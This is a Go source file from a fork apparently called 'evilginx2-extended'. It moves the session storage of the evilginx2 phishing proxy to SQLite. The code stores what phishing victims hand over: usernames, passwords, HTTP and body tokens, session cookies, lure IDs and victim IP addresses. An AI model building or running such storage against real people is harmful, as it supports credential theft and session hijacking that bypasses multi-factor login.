package database

// database_sqlite.go — evilginx2-extended: SQLite storage (Pro-feature #14).
// Replaces the buntDB embedded store with SQLite (modernc.org pure-Go driver).
// Exported API is unchanged, so core/ and the REST API need no modifications.

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	LureId       string                             `json:"lure_id,omitempty"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
	Completed    bool                               `json:"completed"`
	ReopenUrl    string                             `json:"reopen_url,omitempty"` // set from the phishlet at API level, not persisted
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

type Database struct {
	path string
	db   *sql.DB
	mtx  sync.Mutex
}

const sessionsSchema = `CREATE TABLE IF NOT EXISTS sessions (
	id INTEGER PRIMARY KEY AUTOINCREMENT,
	session_id TEXT NOT NULL UNIQUE,
	phishlet TEXT NOT NULL DEFAULT '',
	lure_id TEXT NOT NULL DEFAULT '',
	landing_url TEXT NOT NULL DEFAULT '',
	username TEXT NOT NULL DEFAULT '',
	password TEXT NOT NULL DEFAULT '',
	custom TEXT NOT NULL DEFAULT '{}',
	body_tokens TEXT NOT NULL DEFAULT '{}',
	http_tokens TEXT NOT NULL DEFAULT '{}',
	cookie_tokens TEXT NOT NULL DEFAULT '{}',
	useragent TEXT NOT NULL DEFAULT '',
	remote_addr TEXT NOT NULL DEFAULT '',
	create_time INTEGER NOT NULL DEFAULT 0,
	update_time INTEGER NOT NULL DEFAULT 0,
	is_done INTEGER NOT NULL DEFAULT 0
)`

func NewDatabase(path string) (*Database, error) {
	d := &Database{
		path: path,
	}
	db, err := sql.Open("sqlite", path)
	if err != nil {
		return nil, err
	}
	db.SetMaxOpenConns(1) // single writer; simple and safe for lab scale
	if _, err := db.Exec("PRAGMA journal_mode=WAL"); err != nil {
		return nil, err
	}
	if _, err := db.Exec(sessionsSchema); err != nil {
		return nil, err
	}
	// Older databases predate lure attribution and completion tracking; add
	// the columns once.
	db.Exec("ALTER TABLE sessions ADD COLUMN lure_id TEXT NOT NULL DEFAULT ''")
	db.Exec("ALTER TABLE sessions ADD COLUMN is_done INTEGER NOT NULL DEFAULT 0")
	d.db = db
	return d, nil
}

const sessionCols = "id, session_id, phishlet, lure_id, landing_url, username, password, custom, body_tokens, http_tokens, cookie_tokens, useragent, remote_addr, create_time, update_time, is_done"

func jsonBytes(v interface{}) string {
	b, err := json.Marshal(v)
	if err != nil {
		return "{}"
	}
	return string(b)
}

func scanSession(row interface{ Scan(...interface{}) error }) (*Session, error) {
	s := &Session{
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
	}
	var custom, body, http, cookie string
	var done int
	if err := row.Scan(&s.Id, &s.SessionId, &s.Phishlet, &s.LureId, &s.LandingURL, &s.Username, &s.Password,
		&custom, &body, &http, &cookie, &s.UserAgent, &s.RemoteAddr, &s.CreateTime, &s.UpdateTime, &done); err != nil {
		return nil, err
	}
	s.Completed = done != 0
	json.Unmarshal([]byte(custom), &s.Custom)
	json.Unmarshal([]byte(body), &s.BodyTokens)
	json.Unmarshal([]byte(http), &s.HttpTokens)
	json.Unmarshal([]byte(cookie), &s.CookieTokens)
	return s, nil
}

func (d *Database) CreateSession(sid string, phishlet string, lure_id string, landing_url string, useragent string, remote_addr string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	now := time.Now().Unix()
	_, err := d.db.Exec(
		"INSERT INTO sessions (session_id, phishlet, lure_id, landing_url, useragent, remote_addr, create_time, update_time) VALUES (?,?,?,?,?,?,?,?)",
		sid, phishlet, lure_id, landing_url, useragent, remote_addr, now, now)
	if err != nil {
		return fmt.Errorf("session already exists: %s", sid)
	}
	return nil
}

// SessionFilter narrows the session list for the management API.
type SessionFilter struct {
	Phishlet string
	Lure     string
	SinceID  int64
	Limit    int
}

func (d *Database) ListSessionsFiltered(f SessionFilter) ([]*Session, error) {
	query := "SELECT " + sessionCols + " FROM sessions"
	clauses := []string{}
	args := []interface{}{}
	if f.Phishlet != "" {
		clauses = append(clauses, "phishlet = ?")
		args = append(args, f.Phishlet)
	}
	if f.Lure != "" {
		clauses = append(clauses, "lure_id = ?")
		args = append(args, f.Lure)
	}
	if f.SinceID > 0 {
		clauses = append(clauses, "id > ?")
		args = append(args, f.SinceID)
	}
	for i, clause := range clauses {
		if i == 0 {
			query += " WHERE " + clause
		} else {
			query += " AND " + clause
		}
	}
	query += " ORDER BY id"
	if f.Limit > 0 {
		query += " LIMIT ?"
		args = append(args, f.Limit)
	}
	rows, err := d.db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []*Session{}
	for rows.Next() {
		s, err := scanSession(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, s)
	}
	return out, rows.Err()
}

func (d *Database) ListSessions() ([]*Session, error) {
	rows, err := d.db.Query("SELECT " + sessionCols + " FROM sessions ORDER BY id")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []*Session{}
	for rows.Next() {
		s, err := scanSession(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, s)
	}
	return out, rows.Err()
}

func (d *Database) GetSessionById(id int) (*Session, error) {
	row := d.db.QueryRow("SELECT "+sessionCols+" FROM sessions WHERE id = ?", id)
	s, err := scanSession(row)
	if err != nil {
		return nil, fmt.Errorf("session not found: %d", id)
	}
	return s, nil
}

func (d *Database) getSessionBySid(sid string) (*Session, error) {
	row := d.db.QueryRow("SELECT "+sessionCols+" FROM sessions WHERE session_id = ?", sid)
	s, err := scanSession(row)
	if err != nil {
		return nil, fmt.Errorf("session not found: %s", sid)
	}
	return s, nil
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET username = ?, update_time = ? WHERE session_id = ?", username, time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET password = ?, update_time = ? WHERE session_id = ?", password, time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	s, err := d.getSessionBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	_, err = d.db.Exec("UPDATE sessions SET custom = ?, update_time = ? WHERE session_id = ?", jsonBytes(s.Custom), time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET body_tokens = ?, update_time = ? WHERE session_id = ?", jsonBytes(tokens), time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET http_tokens = ?, update_time = ? WHERE session_id = ?", jsonBytes(tokens), time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET cookie_tokens = ?, update_time = ? WHERE session_id = ?", jsonBytes(tokens), time.Now().Unix(), sid)
	return err
}

func (d *Database) SetSessionDone(sid string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("UPDATE sessions SET is_done = 1, update_time = ? WHERE session_id = ?", time.Now().Unix(), sid)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("DELETE FROM sessions WHERE session_id = ?", sid)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	d.mtx.Lock()
	defer d.mtx.Unlock()
	_, err := d.db.Exec("DELETE FROM sessions WHERE id = ?", id)
	return err
}

func (d *Database) Close() error {
	return d.db.Close()
}

func (d *Database) Flush() {
	// WAL checkpoints happen automatically; nothing to shrink.
}
